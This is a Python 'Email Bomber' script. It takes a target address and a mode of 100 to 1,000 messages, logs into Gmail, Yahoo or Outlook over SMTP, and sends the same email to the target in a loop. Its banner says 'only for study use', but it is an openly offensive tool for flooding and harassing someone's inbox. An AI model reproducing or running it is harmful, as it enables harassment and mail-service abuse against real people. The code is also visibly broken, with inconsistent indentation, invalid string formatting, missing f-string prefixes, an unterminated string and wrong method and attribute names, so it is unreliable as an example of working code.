import smtplib
import sys

class bgcolors:
    GREEN='\033'
    YELLOW='\033'
    RED='\033'
    WHITE='\033'

def front():
    print(10*'\t'+bgcolors.GREEN+'< < < Email Bomber > > >')
    print('\t'+bgcolors.GREEN+'Made by an Indian',end='\n')
    print('\t'+bgcolors.WHITE+'Lets make some email bombs',end='\t')
    print('Only for study use')
    
class Emailbomber:
    c=0
    def __init__(self):
        try:
            print(bgcolors.RED+'\n<<<Loading programs........>>>')
            self.target=input(bgcolors.YELLOW + 'Enter the target email: ')
            self.mode=int(input(bgcolors.YELLOW + "Enter the BOMB mode (1,2,3,4)'+'\n'+1.1000 mails 2.500mails 3.250 mails 4.100mails : "))
            if int(self.mode)>int(4) or int(self.mode)<1:
                            print("Enter a valid option",end="\n")
                            sys.exit(1)
        except Exception as ex:
            print(ex)
            
    def bomb(self):
        try:
            print(bgcolors.RED + "<  <  <  Setting up your BOMB  >  >  >",end="\n")
            self.amount=None
            if self.mode==int(1):
                self.amount=int(1000)
            elif self.mode==int(2):
                self.amount=int(500)
            elif self.mode==int(3):
                self.amount=int(250)
            else:
                self.amount=int(100)
            print(bgcolors.YELLOW + "\n Bomb setup successful with {self.mode} and {self.amount} ")
       except Exception as e:
            print("\n"+e,end="\n")
            
   def email(self):
       try:
           print(bgcolors.RED + "\n < < < Setting up email > > >")
           self.server=input('Enter email server - 1:Gmail  2:Yahoo  3:Outlook')
           premade=['1','2','3']
           default_port=True
           if self.server not in premade:
               default_port=False
               self.port=input(bgcolors.YELLOW + "Enter a port number : ")
           if default_port==True:
               self.port=int(587)
           if self.server=='1':
               self.server="smtp.gmail.com"
           elif self.server=='2':
               self.server="smtp.mail.yahoo.com"
           elif self.server=='3':
               self.server="smtp-mail.outlook.com"
           self.fAddr=input(bgcolors.GREEN + "Enter your email address: ")
           self.fpwd=input(bgcolors.GREEN + "Enter your password: ")
           self.sub=input(bgcolors.GREEN + "Enter your subject: ")
           self.msg=input(bgcolors.YELLOW + "Enter your message: ")
           self.msg="From: %s\n To: %s\n Subject: %s\n %s".%(self.fAddr,self.target,self.sub,self.msg)
           self.s=smtplib.SMTP(self.server,self.port)
           self.s.ehlo()
           self.s.starttls()
           self.s.ehlo()
           self.login(self.fAddr,self.fpwd)
      except Exception as e:
          print("\n"+ e)

  def send(self):
      try:
          self.s.sendmail(self.fAddr,self.target,self.msg)
          self.count+=1
          print(bgcolors.RED + "BOMB : {self.count}")
      except Exception as e:
          print("ERROR : {e}

  def attack(self):
      print(bgcolors.RED + "\n < < < Attacking....... > > >")
      for email in range(self.amount+1):
          self.send()
      self.s.close()
      print("\n < < < Attack successful > > >")
      sys.exit(0)
                                          
if __name__=='__main__':
          front()
          bomb =Emailbomber()
          bomb.bomb()
          bomb.email()
          bomb.send()
          bomb.attack()
